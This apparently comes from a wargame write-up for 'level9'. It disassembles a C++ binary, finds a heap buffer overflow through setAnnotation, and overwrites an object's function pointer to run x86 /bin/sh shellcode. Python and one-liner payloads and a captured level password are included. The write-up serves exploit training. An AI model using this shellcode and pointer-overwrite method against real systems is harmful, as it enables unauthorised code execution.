./level9 $(python exploit.py)

$ ./level9
=>
$ ./level9 adsfads
=>
$ ./level9 asdfa adsfads
=>

Nothing seems to do anything. so we start to disas the main
$ gdb level9
$ (gdb) disas main
    0x0804860b <+23>:	call   0x80484f0 <_exit@plt>
    0x08048617 <+35>:	call   0x8048530 <_Znwj@plt>
    0x08048629 <+53>:	call   0x80486f6 <_ZN1NC2Ei>
    0x08048639 <+69>:	call   0x8048530 <_Znwj@plt>
    0x0804864b <+87>:	call   0x80486f6 <_ZN1NC2Ei>
    0x08048677 <+131>:	call   0x804870e <_ZN1N13setAnnotationEPc>
    0x0804867c <+136>:	mov    0x10(%esp),%eax
    0x08048680 <+140>:	mov    (%eax),%eax
    0x08048682 <+142>:	mov    (%eax),%edx
    0x08048684 <+144>:	mov    0x14(%esp),%eax
    0x08048688 <+148>:	mov    %eax,0x4(%esp)
    0x0804868c <+152>:	mov    0x10(%esp),%eax
    0x08048690 <+156>:	mov    %eax,(%esp)
    0x08048693 <+159>:	call   *%edx

At first, we can see this function <_Znwj> which is, a <new>, so we can deduce we're facing c++ code.

the code is instancing 2 times the same class and then call the method of the class from the first instance :
    0x08048677 <+131>:	call   0x804870e <_ZN1N13setAnnotationEPc>
We can see that there's a little security that calls <exit> if we don't have at least one argument since this function takes argv[1] as argument.

In first hand we can see in the disas code that a call with double dereferencement of obj2. In other hand we can see a memcpy of argv[1] in a fix size buffer in the class N.
The methode is call after the initialisation of two object, so we can overflow the buffer and overwrite the obj2. We will overwrite the address of the pointer to the operator_+.

So here's how we will proceed :

First, we find the offset

We can see in main that the call of obj2 is the call of the function pointed by edx. This one is copy from eax at main<+142>. So we can put a breakpoint just befor the copy and check the value of eax we overwrite.

$ (gdb) b *0x08048682

$ (gdb) run 'AAAABBBBCCCCDDDDEEEEFFFFGGGGHHHHIIIIJJJJKKKKLLLLMMMMNNNNOOOOPPPPQQQQRRRRSSSSTTTTUUUUVVVVWWWWXXXXYYYYZZZZaaaabbbbccccddddeeee'
$ (gdb) i r
eax            0x62626262
the offset is at "bbbb", so the offset is 108

We can put the address of pointer, the pointer and shellcode at the end of the buffer.

We know that the methode setAnnotation return the address of the copy so we can juste watch the return register after call(eax).


$ (gdb) b *0x0804867c
run the programm

(gdb) r $(python -c 'print "A" * 108 + "BBBB" + "CCCC" + "DDDD"')

(gdb) x/50wx $eax
0x804a00c:	0x41414141	0x41414141	0x41414141	0x41414141
0x804a01c:	0x41414141	0x41414141	0x41414141	0x41414141
0x804a02c:	0x41414141	0x41414141	0x41414141	0x41414141
0x804a03c:	0x41414141	0x41414141	0x41414141	0x41414141
0x804a04c:	0x41414141	0x41414141	0x41414141	0x41414141
0x804a05c:	0x41414141	0x41414141	0x41414141	0x41414141
0x804a06c:	0x41414141	0x41414141	0x41414141	0x42424242
0x804a07c:	0x43434343	0x44444444	0x00000000	0x00000000
0x804a08c:	0x00000000	0x00000000	0x00000000	0x00000000
0x804a09c:	0x00000000	0x00000000	0x00000000	0x00000000
0x804a0ac:	0x00000000	0x00000000	0x00000000	0x00000000
0x804a0bc:	0x00000000	0x00000000	0x00000000	0x00000000
0x804a0cc:	0x00000000	0x00000000

The block filled by 42 is where the address of the pointer is stror, we will make it point to the next block fill with 43, that it self will point to the next block with the shell code

Now we have all the information we need to make our payload.

```python
#! /usr/bin/env python

OFFSET = "A" * 108

ADDR = "\x7c\xa0\x04\x08"

ADDR1 = "\x80\xa0\04\x08"

SHELLCODE = "\x31\xc0\x31\xdb\xb0\x06\xcd\x80\x53\x68/tty\x68/dev\x89\xe3\x31\xc9\x66\xb9\x12\x27\xb0\x05\xcd\x80\x31\xc0\x50\x68//sh\x68/bin\x89\xe3\x50\x53\x89\xe1\x99\xb0\x0b\xcd\x80"

CONTENT = OFFSET + ADDR + ADDR1 + SHELLCODE

print(CONTENT)
```

$ cat /home/user/bonus0/.pass
=> f3f0004b6f364cb5a4147e9ef827fa922a4861408845c26b6971ad770d906728

one liner : ./level9 $(python -c 'print "A" * 108 + "\x7c\xa0\x04\x08" + "\x80\xa0\04\x08" + "\x31\xc0\x31\xdb\xb0\x06\xcd\x80\x53\x68/tty\x68/dev\x89\xe3\x31\xc9\x66\xb9\x12\x27\xb0\x05\xcd\x80\x31\xc0\x50\x68//sh\x68/bin\x89\xe3\x50\x53\x89\xe1\x99\xb0\x0b\xcd\x80"')

